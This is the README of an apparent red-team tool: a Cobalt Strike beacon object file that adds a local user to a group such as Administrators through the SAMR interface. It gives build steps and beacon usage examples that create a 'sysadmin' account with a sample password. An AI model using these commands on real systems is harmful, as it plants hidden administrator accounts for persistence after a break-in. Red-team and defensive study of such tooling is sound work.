# adduserbysamr-bof

Cobalt Strike BOF that Add a user to localgroup by samr.

## Build

```sh
git clone https://github.com/AgeloVito/adduserbysamr-bof.git
```

```sh 
make
```


**And load adduserbysamr.cna**


## Usage

```
beacon> help adduserbysamr
Use: adduserbysamr [username] [password] [groupName]
e.g: adduserbysamr sysadmin p@ssw0rd
     adduserbysamr sysadmin p@ssw0rd Administrators
     adduserbysamr sysadmin p@ssw0rd "Remote Desktop Users"

Add a user to localgroup by samr, groupName is "Administrators" by default, do not use it at AD.
```

<img width="1159" alt="image" src="https://user-images.githubusercontent.com/9564171/204729530-da9e2f25-a65a-4d16-a7d7-c7026c1d88ef.png">

<img width="1378" alt="image" src="https://user-images.githubusercontent.com/9564171/204736655-52747dae-18f7-407b-ae27-e499b6a89cb6.png">


## Refence

https://loong716.top/posts/MS_SAMR_Tips/
https://idiotc4t.com/redteam-research/netuseradd-ni-xiang
https://learn.microsoft.com/zh-cn/windows/win32/secmgmt/built-in-and-account-domains

